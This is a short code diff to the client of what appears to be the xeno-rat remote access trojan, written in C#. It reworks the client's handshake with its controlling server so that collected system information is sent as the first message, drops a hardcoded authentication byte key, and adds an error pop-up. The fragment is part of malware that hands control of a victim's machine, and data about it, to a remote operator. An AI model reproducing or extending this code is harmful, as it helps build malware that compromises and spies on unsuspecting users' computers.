@@ -3,7 +3,6 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -121,15 +120,14 @@ namespace xeno_rat_client
         {
             sock.ResetRecvTimeout();
         }
-        public async Task<bool> AuthenticateAsync(int type, int id = 0)//0 = main, 1 = heartbeat, 2 = anything else
+        public async Task<bool> AuthenticateAsync(int type, int id = 0, byte[] sysInfo = null)//0 = main, 1 = heartbeat, 2 = anything else
         {
             byte[] data;
-            byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 };
             try
             {
                 byte[] _SockType = sock.IntToBytes(type);
                 // 4.client发出请求，type=0
-                if (!(await sock.SendAsync(_SockType)))
+                if (!(await sock.SendAsync(sysInfo, 0)))
                 {
                     return false;
                 }
@@ -155,9 +153,9 @@ namespace xeno_rat_client
                 SockType = type;
                 return true;
             }
-            catch
+            catch(Exception e)
             {
-
+                MessageBox.Show("failed" + e.Message, "Client.Node.AuthenticateAsync");
             }
             return false;
         }
